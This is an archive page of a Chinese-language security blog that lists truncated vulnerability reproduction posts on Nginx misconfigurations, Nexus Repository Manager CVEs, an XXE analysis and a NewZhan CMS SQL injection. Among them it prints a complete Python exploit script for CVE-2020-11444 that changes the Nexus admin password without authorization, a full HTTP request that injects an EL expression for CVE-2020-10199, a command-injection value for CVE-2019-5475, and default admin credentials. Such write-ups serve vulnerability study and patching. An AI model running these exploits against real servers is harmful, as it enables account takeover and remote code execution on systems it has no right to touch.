<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>She11c0de&#39;s blogs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="She11c0de&#39;s blogs">
<meta property="og:url" content="https://she11c0de.github.io/page/58/index.html">
<meta property="og:site_name" content="She11c0de&#39;s blogs">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="She11c0de">
<meta name="twitter:card" content="summary">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/scrollUp/image.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.2"></head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div class="logo">
        <img src="/logo.png" alt="Profile Picture">
      </div>
      <div id="title">She11c0de's blogs</div>
      
       <ul class="my-socials">
  
 
</ul>
    </div>
  </div>
  <div id="header-inner" class="">
    <nav id="main-nav">
      <a id="main-nav-toggle" class="nav-icon"></a>
      <!--
        
          
            <a class="main-nav-link" href="/">首页</a>
          
            <a class="main-nav-link" href="/categories/life">生活</a>
          
            <a class="main-nav-link" href="/archives">归档</a>
          
        
      -->
    </nav>
    <nav id="title-nav" style="display:none">
      <a href="/">She11c0de&#39;s blogs</a>
      <img src="/logo.png" alt="Profile Picture">
      <!--
      <span id="title-nav-socials">
        
       
     </span>
      -->
    </nav>
    <nav id="sub-nav">
      
      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
    </nav>
    <div id="search-form-wrap">
      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
        <input type="submit" value="" class="search-form-submit">
        <input name=tn type=hidden value="bds">
        <input name=cl type=hidden value="3">
        <input name=ct type=hidden value="2097152">
        <input type="hidden" name="si" value="she11c0de.github.io">
      </form>
    </div>
  </div>
  <div class="site-nav" style="display: none;">
    <ul>
      
      
        <li><a href="/">首页</a></li>
      
        <li><a href="/categories/life">生活</a></li>
      
        <li><a href="/archives">归档</a></li>
      
      
    </ul>
  </div>
</header>
      <div class="outer">
        <section id="main">
  

    
    <article id="post-Nginx/Nginx 配置错误漏洞 add_header被覆盖" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Nginx/Nginx%20%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E6%BC%8F%E6%B4%9E%20add_header%E8%A2%AB%E8%A6%86%E7%9B%96/" class="article-date">
  <time datetime="2022-07-08T06:26:00.278Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Nginx-配置错误漏洞-add-header被覆盖"><a href="#Nginx-配置错误漏洞-add-header被覆盖" class="headerlink" title="Nginx 配置错误漏洞 add_header被覆盖"></a>Nginx 配置错误漏洞 add_header被覆盖</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>Nginx配置文件子块（server、location、if）中的<code>add_header</code>，将会覆盖父块中的<code>add_header</code>添加的HTTP头，造成一些安全隐患。</p>
<p>如下列代码，整站（父块中）添加了CSP头：</p>
<pre><code>add_header Content-Security-Policy &quot;default-src &#39;self&#39;&quot;;
add_header X-Frame-Options DENY;

location = /test1 &#123;
    rewrite ^(.*)$ /xss.html break;
&#125;

location = /test2 &#123;
    add_header X-Content-Type-Options nosniff;
    rewrite ^(.*)$ /xss.html break;
&#125;
</code></pre>
<p>但<code>/test2</code>的location中又添加了<code>X-Content-Type-Options</code>头，导致父块中的<code>add_header</code>全部失效：</p>
<p><img src="/resource/Nginx%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E6%BC%8F%E6%B4%9Eadd_header%E8%A2%AB%E8%A6%86%E7%9B%96/media/rId24.png"></p>
<p>XSS可被触发：</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Nginx/Nginx%20%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E6%BC%8F%E6%B4%9E%20add_header%E8%A2%AB%E8%A6%86%E7%9B%96/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Nginx/Nginx%20%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E6%BC%8F%E6%B4%9E%20add_header%E8%A2%AB%E8%A6%86%E7%9B%96/" data-id="cl5c2qt0e00chy8v16x3h46pb" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Nginx/Nginx 解析漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Nginx/Nginx%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:26:00.275Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Nginx-解析漏洞"><a href="#Nginx-解析漏洞" class="headerlink" title="Nginx 解析漏洞"></a>Nginx 解析漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><ul>
<li>  Nginx 1.x 最新版</li>
<li>  PHP 7.x最新版</li>
</ul>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>直接执行<code>docker-compose up -d</code>启动容器，无需编译。</p>
<p>访问<code>http://www.0-sec.org/uploadfiles/nginx.png</code>和<code>http://your-ip/uploadfiles/nginx.png/.php</code>即可查看效果。</p>
<p>正常显示：</p>
<p><img src="/resource/Nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/media/rId24.jpg"></p>
<p>增加<code>/.php</code>后缀，被解析成PHP文件：</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Nginx/Nginx%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Nginx/Nginx%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qt0d00cgy8v149oc9goa" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Nexus/（CVE-2020-11444）Nexus Repository Manager 远程代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Nexus/%EF%BC%88CVE-2020-11444%EF%BC%89Nexus%20Repository%20Manager%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:26:00.130Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2020-11444）Nexus-Repository-Manager-远程代码执行漏洞"><a href="#（CVE-2020-11444）Nexus-Repository-Manager-远程代码执行漏洞" class="headerlink" title="（CVE-2020-11444）Nexus Repository Manager 远程代码执行漏洞"></a>（CVE-2020-11444）Nexus Repository Manager 远程代码执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>该漏洞源于不正确的访问控制。攻击者可借助特制的请求利用该漏洞绕过访问限制。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Nexus Repository Manager 3.x版本至3.21.2版本</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>cve-2020-11444_exp.py
python3 cve-2020-11444_exp.py http://www.0-sec.org:8081 &quot;sessionID&quot; &quot;touch /tmp/233&quot;
#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author:zhzyker
# from:https://github.com/zhzyker/exphub

import sys
import requests

if len(sys.argv)!=4:
    print(&#39;+-----------------------------------------------------------------------------------------------+&#39;)
    print(&#39;+ DES: by zhzyker as https://github.com/zhzyker/exphub                                          +&#39;)
    print(&#39;+      CVE-2020-11444 Nexus 3 Unauthorized Vuln (change admin password                          +&#39;)
    print(&#39;+-----------------------------------------------------------------------------------------------+&#39;)
    print(&#39;+ USE: python3 &lt;filename&gt; &lt;url&gt; &lt;session&gt; &lt;password&gt;                                            +&#39;)
    print(&#39;+ EXP: python3 cve-2020-11444_exp.py http://ip:8081 6c012a5e-88d9-4f96-a05f-3790294dc49a 123456 +&#39;)
    print(&#39;+ VER: Nexus Repository Manager 3.x OSS / Pro &lt;= 3.21.1                                         +&#39;)
    print(&#39;+-----------------------------------------------------------------------------------------------+&#39;)
    sys.exit(0)

url = sys.argv[1]
vuln_url = url + &quot;/service/rest/beta/security/users/admin/change-password&quot;
session = sys.argv[2]
password = sys.argv[3]

headers = &#123;
    &#39;accept&#39;: &quot;application/json&quot;,
    &#39;User-Agent&#39;: &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36&quot;,
    &#39;NX-ANTI-CSRF-TOKEN&#39;: &quot;0.6080434247960143&quot;,
    &#39;Content-Type&#39;: &quot;text/plain&quot;,
    &#39;Origin&#39;: &quot;http://127.0.0.1:8081&quot;,
    &#39;Cookie&#39;: &quot;NX-ANTI-CSRF-TOKEN=0.6080434247960143; NXSESSIONID=&quot;+session+&quot;&quot;
&#125;
data = &quot;&quot;&quot;%s&quot;&quot;&quot; % password

r = requests.request(&#39;PUT&#39;, url=vuln_url, headers=headers, data=data)
if r.status_code == 204:
    print (&quot;[+] Passowrd Change Success&quot;)
    print (&quot;[+] &quot; + url)
    print (&quot;[+] Username:admin Passowrd:&quot;+password+&quot;&quot;)
else:
    print (&quot;[-] SessionID Not available&quot;)
    print (&quot;[-] Target Not CVE-2020-11444 Vuln Good Luck&quot;)
    sys.exit(0)
</code></pre>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/zhzyker/exphub/blob/master/nexus/cve-2020-11444/_exp.py">https://github.com/zhzyker/exphub/blob/master/nexus/cve-2020-11444\_exp.py</a></p>
</blockquote>

        
          <p class="article-more-link">
            <a href="/2022/07/07/Nexus/%EF%BC%88CVE-2020-11444%EF%BC%89Nexus%20Repository%20Manager%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Nexus/%EF%BC%88CVE-2020-11444%EF%BC%89Nexus%20Repository%20Manager%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qsxd00c7y8v11x4m58uw" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Nexus/（CVE-2020-10204）Nexus Repository Manager 远程执行代码漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Nexus/%EF%BC%88CVE-2020-10204%EF%BC%89Nexus%20Repository%20Manager%20%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:26:00.127Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2020-10204）Nexus-Repository-Manager-远程执行代码漏洞"><a href="#（CVE-2020-10204）Nexus-Repository-Manager-远程执行代码漏洞" class="headerlink" title="（CVE-2020-10204）Nexus Repository Manager 远程执行代码漏洞"></a>（CVE-2020-10204）Nexus Repository Manager 远程执行代码漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>所有以前的Nexus Repository Manager 3.x OSS / Pro最高版本包括3.21.1</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>下载pull下漏洞版本的docker</p>
<pre><code>https://hub.docker.com/r/sonatype/nexus3/tags
docker pull sonatype/nexus3:3.21.1
</code></pre>
<p>然后切成root用户进入容器修改启动项**/opt/sonatype/nexus/bin/nexus**</p>
<pre><code>run)

$INSTALL4J_JAVA_PREFIX exec &quot;$app_java_home/bin/java&quot;  -Xdebug -server -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=8888 -Dinstall4j.jvmDir=&quot;$app_java_home&quot; -Dexe4j.moduleName=&quot;$prg_dir/$progname&quot; &quot;-XX:+UnlockDiagnosticVMOptions&quot; &quot;-Dinstall4j.launcherId=245&quot; &quot;-Dinstall4j.swt=false&quot; &quot;$vmov_1&quot; &quot;$vmov_2&quot; &quot;$vmov_3&quot; &quot;$vmov_4&quot; &quot;$vmov_5&quot; $INSTALL4J_ADD_VM_PARAMS -classpath &quot;$local_classpath&quot; com.install4j.runtime.launcher.UnixLauncher run 9d17dc87 0 0 org.sonatype.nexus.karaf.NexusMain
</code></pre>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Nexus/%EF%BC%88CVE-2020-10204%EF%BC%89Nexus%20Repository%20Manager%20%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Nexus/%EF%BC%88CVE-2020-10204%EF%BC%89Nexus%20Repository%20Manager%20%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qsxd00c6y8v14m1e9h96" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Nexus/（CVE-2020-10199）Nexus Repository Manager 远程代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Nexus/%EF%BC%88CVE-2020-10199%EF%BC%89Nexus%20Repository%20Manager%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:26:00.125Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2020-10199）Nexus-Repository-Manager-远程代码执行漏洞"><a href="#（CVE-2020-10199）Nexus-Repository-Manager-远程代码执行漏洞" class="headerlink" title="（CVE-2020-10199）Nexus Repository Manager 远程代码执行漏洞"></a>（CVE-2020-10199）Nexus Repository Manager 远程代码执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>该漏洞允许拥有Nexus Repository Manager 上任何类型帐户的攻击者通过向Nexus<br>Repository Manager 发出恶意 JavaEL 表达式来执行任意代码。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Nexus Repository Manager 3.x OSS / Pro &lt;= 3.21.1</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>登录后，复制当前Cookie和CSRF Token，发送如下数据包，即可执行EL表达式：</p>
<pre><code>POST /service/rest/beta/repositories/go/group HTTP/1.1
Host: www.0-sec.org:8081
Content-Length: 203
X-Requested-With: XMLHttpRequest
X-Nexus-UI: true
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
NX-ANTI-CSRF-TOKEN: 0.7886248393834028
Content-Type: application/json
Accept: */*
Origin: http://127.0.0.1:8081
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Referer: http://127.0.0.1:8081/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: NX-ANTI-CSRF-TOKEN=0.7886248393834028; NXSESSIONID=cedf848f-d881-4b58-ac24-9e9c3ece40bc
Connection: close
 
&#123;
  &quot;name&quot;: &quot;internal&quot;,
  &quot;online&quot;: true,
  &quot;storage&quot;: &#123;
    &quot;blobStoreName&quot;: &quot;default&quot;,
    &quot;strictContentTypeValidation&quot;: true
  &#125;,
  &quot;group&quot;: &#123;
    &quot;memberNames&quot;: [&quot;$\\A&#123;233*233*233&#125;&quot;]
  &#125;
&#125;
</code></pre>
<h3 id="（1）尝试执行233233233，成功返回结果"><a href="#（1）尝试执行233233233，成功返回结果" class="headerlink" title="（1）尝试执行233233233，成功返回结果"></a>（1）尝试执行233<em>233</em>233，成功返回结果</h3><p><img src="/resource/(CVE-2020-10199)NexusRepositoryManager%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId25.png" alt="1.png"></p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Nexus/%EF%BC%88CVE-2020-10199%EF%BC%89Nexus%20Repository%20Manager%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Nexus/%EF%BC%88CVE-2020-10199%EF%BC%89Nexus%20Repository%20Manager%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qsxd00c8y8v1b56d9rrq" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Nexus/（CVE-2019-7238）Nexus Repository Manager 远程代码执行" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Nexus/%EF%BC%88CVE-2019-7238%EF%BC%89Nexus%20Repository%20Manager%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" class="article-date">
  <time datetime="2022-07-08T06:26:00.123Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2019-7238）Nexus-Repository-Manager-远程代码执行"><a href="#（CVE-2019-7238）Nexus-Repository-Manager-远程代码执行" class="headerlink" title="（CVE-2019-7238）Nexus Repository Manager 远程代码执行"></a>（CVE-2019-7238）Nexus Repository Manager 远程代码执行</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Nexus Repository Manager OSS/Pro 3.6.2 版本到 3.14.0 版本</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>定位到如下位置<br>plugins/nexus-coreui-plugin/src/main/java/org/sonatype/nexus/coreui/ComponentComponent.groovy:185</p>
<pre><code>@Named
@Singleton
@DirectAction(action = &#39;coreui_Component&#39;)
class ComponentComponent
    extends DirectComponentSupport
&#123;
    ...

    @DirectMethod
    @Timed
    @ExceptionMetered
    PagedResponse&lt;AssetXO&gt; previewAssets(final StoreLoadParameters parameters) &#123;

        String repositoryName = parameters.getFilter(&#39;repositoryName&#39;)
        String expression = parameters.getFilter(&#39;expression&#39;)
        String type = parameters.getFilter(&#39;type&#39;)
        // 接收三个参数 repositoryName 、 expression 、 type

        if (!expression || !type || !repositoryName) &#123;
        return null
        &#125;

        // 设置 repositoryName
        RepositorySelector repositorySelector = RepositorySelector.fromSelector(repositoryName)

        // 根据 type 分别调用不同的 validate
        if (type == JexlSelector.TYPE) &#123;
            jexlExpressionValidator.validate(expression)
        &#125;
        else if (type == CselSelector.TYPE) &#123;
            cselExpressionValidator.validate(expression)
        &#125;

        List&lt;Repository&gt; selectedRepositories = getPreviewRepositories(repositorySelector)
        if (!selectedRepositories.size()) &#123;
            return null
        &#125;

        def result = browseService.previewAssets(
            repositorySelector,
            selectedRepositories,
            expression,
            toQueryOptions(parameters))
        return new PagedResponse&lt;AssetXO&gt;(
            result.total,
            result.results.collect(ASSET_CONVERTER.rcurry(null, null, [:], 0)) // buckets not needed for asset preview screen
        )
    &#125; 
    ...
&#125;
</code></pre>
<p>Nexus为了查询方便，特地在jexl的基础上引入了csel表达式。简单起见，这里不做展开。接着我们跟入<code>browseService.previewAssets</code>，接口定义在<br>components/nexus-repository/src/main/java/org/sonatype/nexus/repository/browse/BrowseService.java:59</p>
<pre><code>/**
   * Returns a &#123;@link BrowseResult&#125; for previewing the specified repository based on an arbitrary content selector.
   */
  BrowseResult&lt;Asset&gt; previewAssets(final RepositorySelector selectedRepository,
                                    final List&lt;Repository&gt; repositories,
                                    final String jexlExpression,
                                    final QueryOptions queryOptions);
</code></pre>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Nexus/%EF%BC%88CVE-2019-7238%EF%BC%89Nexus%20Repository%20Manager%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Nexus/%EF%BC%88CVE-2019-7238%EF%BC%89Nexus%20Repository%20Manager%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" data-id="cl5c2qsys00c9y8v1c7gyh2me" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Nexus/（CVE-2019-5475）Nexus2 yum插件RCE漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Nexus/%EF%BC%88CVE-2019-5475%EF%BC%89Nexus2%20yum%E6%8F%92%E4%BB%B6RCE%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:26:00.120Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2019-5475）Nexus2-yum插件RCE漏洞"><a href="#（CVE-2019-5475）Nexus2-yum插件RCE漏洞" class="headerlink" title="（CVE-2019-5475）Nexus2 yum插件RCE漏洞"></a>（CVE-2019-5475）Nexus2 yum插件RCE漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>该漏洞默认存在部署权限账号，成功登录后可使用”createrepo”或”mergerepo”自定义配置，可触发远程命令执行漏洞</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Nexus Repository Manager OSS &lt;= 2.14.13 Nexus Repository Manager Pro<br>&lt;= 2.14.13 限制：admin权限才可触发漏洞</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>首先以管理员身份（admin/admin123）登录 然后找到漏洞位置：Capabilities -<br>Yum:Configuration - Settings</p>
<p><img src="/resource/(CVE-2019-5475)Nexus2yum%E6%8F%92%E4%BB%B6RCE%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
<p>点击 Save 抓包，更改mergerepoPath后的value值</p>
<pre><code>C:\\Windows\\System32\\cmd.exe /k dir&amp;
</code></pre>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Nexus/%EF%BC%88CVE-2019-5475%EF%BC%89Nexus2%20yum%E6%8F%92%E4%BB%B6RCE%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Nexus/%EF%BC%88CVE-2019-5475%EF%BC%89Nexus2%20yum%E6%8F%92%E4%BB%B6RCE%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qsxc00c4y8v12g7e4q00" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Nexus/Nexus Repository Manager3 ProXXE分析(CVE-2020-29436)" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Nexus/Nexus%20Repository%20Manager3%20ProXXE%E5%88%86%E6%9E%90(CVE-2020-29436)/" class="article-date">
  <time datetime="2022-07-08T06:26:00.118Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Nexus-Repository-Manager3-ProXXE分析-CVE-2020-29436"><a href="#Nexus-Repository-Manager3-ProXXE分析-CVE-2020-29436" class="headerlink" title="Nexus Repository Manager3 ProXXE分析(CVE-2020-29436)"></a>Nexus Repository Manager3 ProXXE分析(CVE-2020-29436)</h1><p><strong>作者：r00t4dm@Cloud-Penetrating Arrow Lab &amp; Longofo@知道创宇404实验室</strong><br><strong>时间：2020年12月16日</strong></p>
<p>最近Nexus Repository Manager3<a target="_blank" rel="noopener" href="https://support.sonatype.com/hc/en-us/sections/203012668-Security-Advisories">安全公告</a>更新了一个XXE漏洞，虽然需要管理权限才能利用，并且Nexus Repository Manager3在较高的版本中也会强制更改以前较低版本使用的默认密码<code>admin/admin123</code>，最后漏洞触发也很简单，但是过程还是挺有意思，并且不会受到jdk高版本导致不能带换行的问题，列目录、读文件可以带出任意字符，除了二进制文件外，没有找到能编码的协议。</p>
<h2 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h2><p><a target="_blank" rel="noopener" href="https://github.com/sonatype/nexus-public/compare/release-3.28.1-01...release-3.29.0-02">diff</a>下最高漏洞版本3.28.1-01和修复版本3.29.0-02：</p>
<p>![](/resource/Nexus Repository Manager3 ProXXE分析(CVE-2020-29436)/media/v2-e2be1ea0ca7a5049167e98454f591e8d_b.jpg)</p>
<p>可以看到在一个SafeXml#configureValidator中做了限制加载外部dtd的操作，可以注意到这个configureValidator是新增的方法而不是在原方法中修复，但是只是个工具类。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>来到后台Saml的功能点：</p>
<p>![](/resource/Nexus Repository Manager3 ProXXE分析(CVE-2020-29436)/media/v2-f331f8dd3e51ad798740576e028eea85_b.jpg)</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Nexus/Nexus%20Repository%20Manager3%20ProXXE%E5%88%86%E6%9E%90(CVE-2020-29436)/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Nexus/Nexus%20Repository%20Manager3%20ProXXE%E5%88%86%E6%9E%90(CVE-2020-29436)/" data-id="cl5c2qsxc00c3y8v10hz48u64" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-NewZhan CMS/NewZhan CMS sql注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/NewZhan%20CMS/NewZhan%20CMS%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:26:00.086Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="NewZhan-CMS-sql注入漏洞"><a href="#NewZhan-CMS-sql注入漏洞" class="headerlink" title="NewZhan CMS sql注入漏洞"></a>NewZhan CMS sql注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>NewZhan CMS 商业版 2.4.1</p>
